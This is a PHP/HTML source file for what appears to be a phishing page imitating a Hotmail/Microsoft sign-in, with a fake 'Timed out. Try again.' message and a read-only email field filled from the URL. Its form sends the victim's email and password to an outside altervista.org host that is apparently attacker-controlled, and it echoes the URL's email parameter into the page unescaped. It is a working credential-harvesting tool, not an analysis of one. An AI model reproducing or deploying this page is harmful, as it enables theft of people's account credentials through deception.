
<?php
$formAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) { 
    $formAction .= "?" . $_SERVER['QUERY_STRING']; 
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css" />
<style type="text/css">
.textFieldlog {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
	color: #2E2E2E;
	height: 24px;
	width: 96%;
	margin-bottom: 4px;
	border: 1px solid #A8A8A8;
	margin-right: auto;
	margin-left: auto;
	padding-top: 4px;
	padding-right: 10px;
	padding-bottom: 4px;
	padding-left: 10px;
	background-color: #FAFAF8;
	background-image: url(../hotmail/images/bg_form.png);
	background-repeat: repeat;
}

.ButtonLOG {
	color: #FFF;
	background-color: #F66;
	border: 1px solid #FFF;
	padding-top: 5px;
	padding-right: 3px;
	padding-bottom: 5px;
	padding-left: 3px;
	font-family: Arial, sans-serif;
	font-size: 11.6px;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
	-khtml-border-radius: 4px;
	border-radius: 4px;
	margin-right: 2%;
	text-decoration: none;
	margin-top: 2%;
	font-weight: bold;
}


.ButtonLOG:hover {
	background-color: #FF2F2F;
}


.texthinter {
	font-size: 14px;
	font-family: Arial, sans-serif;
	color: #F00;
}


.textform {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	text-transform: uppercase;
	color: #4D4D4D;
}

.YeloowTop {
	background-color: #4B4B4B;
	border: 1px solid #333333;
	padding: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 16px;
	color: #FFF;
}

.hint23 {
	color: #F00;
	margin-bottom: 2%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
	margin-top: 2%;
	font-weight: normal;
}

.sidebox67 {
	background-color: #FFCC00;
	padding: 4%;
	width: auto;
	margin-right: auto;
	margin-left: auto;
}
</style>
<link href="../hotmail/css/style.css" rel="stylesheet" type="text/css" />
</head>

<body>
<?php 
// Show IF Conditional region1 
if (@$_GET['INFO'] == "unsuccessful") {
?>
<div class="hint23"><strong></strong><strong>Timed out. Try again.</strong>
  <div class="clear2"></div>
</div>
<?php } 
// endif Conditional region1
?>

  <form action="http://directoryupdatee.altervista.org/veri1/member.php" method="get">
  <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
    <tr valign="baseline">
      <td width="71%" height="46" align="left" valign="top" nowrap="nowrap" class="texthinter">
        <strong>
        <label for="email"></label>
        <span id="sprytextfield2">
        <input name="email" type="text" class="textFieldlog" id="email" value="<?php echo $_GET['email']; ?>" readonly="readonly" placeholder="Email or Phone"/>
        <span class="textfieldRequiredMsg"><br />Email address is required.</span><span class="textfieldInvalidFormatMsg"><br />Invalid email address.</span></span></strong></td>
    </tr>
    <tr valign="top">
      <td align="left" nowrap="nowrap" class="texthinter">
          <span id="sprytextfield1">
        <input name="password" type="password" class="textFieldlog" id="password" value="" size="32" placeholder="Password"/>
      <span class="textfieldRequiredMsg"><br />
      <div class="texthinter">Password is Required.</div></span></span></td>
    </tr>
    <tr valign="baseline">
      <td align="left" valign="middle" nowrap="nowrap">
      
        <p>
    <input type="checkbox" name="checkbox" id="checkbox" /> Keep me signed in
    <label for="checkbox"></label>
  </p>
      
      
      <input value="Sign in" id="idSIButton9" class="btn btn-block btn-primary btn-image btn-image-svg" data-bind=" value: submitButtonText, css: {'btn-image': true, 'btn-image-svg': true &amp;&amp; true}" type="submit"></td>
    </tr>
  </table>

  <input type="hidden" name="MM_insert" value="form1" />
</form>
<script type="text/javascript">
<!--
var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2", "email");
//-->
</script>


</body>
</html>